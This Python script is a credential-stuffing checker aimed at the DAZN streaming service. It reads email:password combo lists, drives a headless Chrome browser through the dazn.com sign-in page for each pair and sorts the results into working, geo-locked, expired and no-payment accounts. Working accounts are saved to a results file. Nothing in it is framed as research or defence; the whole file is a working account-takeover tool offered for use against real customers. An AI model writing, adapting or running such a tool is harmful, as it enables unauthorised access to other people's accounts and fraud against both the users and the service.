import time
import os
import requests
from modules.connection_error import connection_error_try_block as connection_error
from bs4 import BeautifulSoup as soup
from headers.dazn_header import header
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path
header()
file_directory = str(Path(__file__).parent)+'/dazn'
page = 'https://www.dazn.com/en-GB/signin'
users = []
passwords = []
browser_options = Options()
browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
browser_options.headless = True
os.makedirs('accounts',exist_ok=True)

with open(file_directory, 'r') as dazn:
	for line in dazn.readlines():
			users.append(line.split(':')[0].strip())
			passwords.append(line.split(':')[1].split(' | ')[0].strip())

index = 0
while index != len(users):
	with open('accounts/dazn_working_accounts','a') as account_results:
		try:
			print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
			browser = webdriver.Chrome(options = browser_options)
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(4)			
			if browser.find_elements_by_xpath('//*[@id="onetrust-accept-btn-handler"]'):
				gdpr_accet_all_button = browser.find_element_by_xpath('//*[@id="onetrust-accept-btn-handler"]')
				gdpr_accet_all_button.click()
				time.sleep(1)
			if browser.find_elements_by_xpath('//*[@id="root"]/div/div[2]/div/div[4]/div[1]'):
				geolocked_content_message = browser.find_element_by_xpath('//*[@id="root"]/div/div[2]/div/div[4]/div[1]').text
				print('\n\nIP: {} | Location: {} '.format(connection_error()[0], connection_error()[1]))
				print('Country not supported, please use a supported location/IP address.\nEnding.\n')
				exit()
			email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
			password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
			sign_in_button = browser.find_element_by_xpath('//*[@id="root"]/div[1]/main/form/button')
			email_input_box.send_keys(users[index])
			password_input_box.send_keys(passwords[index])
			sign_in_button.click()
			time.sleep(7)				
			if browser.find_elements_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):			
				error = browser.find_element_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span').text				
				if 'Your email address and/or password are incorrect' in str(error):
					print(" | {}:{} ---> Credentials don't exist".format(users[index],passwords[index]))
				
				if 'You can only access DAZN in the country where you created your account' in str(error):
					print(' | {}:{} ---> Good Account, geo-locked login'.format(users[index],passwords[index]))
					account_results.write('{}:{} ---> Good Account, geo-locked login'.format(users[index],passwords[index]))
					
			elif browser.find_elements_by_xpath('//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):			
				expired_account_text = browser.find_element_by_xpath('//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div').text
				if 'Welcome back.' in expired_account_text:
					print(' | {}:{} ---> Account Expired'.format(users[index],passwords[index]))
					
				if 'Finish signing up' in expired_account_text:
					print(' | {}:{} ---> No Payment Method'.format(users[index],passwords[index]))				
			else:
				print(' | {}:{} ---> Success!'.format(users[index],passwords[index]))
				account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))				
			index +=1				
		except ElementClickInterceptedException:			
			print(' | Click Intercepted, iteration index was not incremented.')			
		except InvalidSessionIdException:
			print('Session terminated unexpectedly.\n')
			break

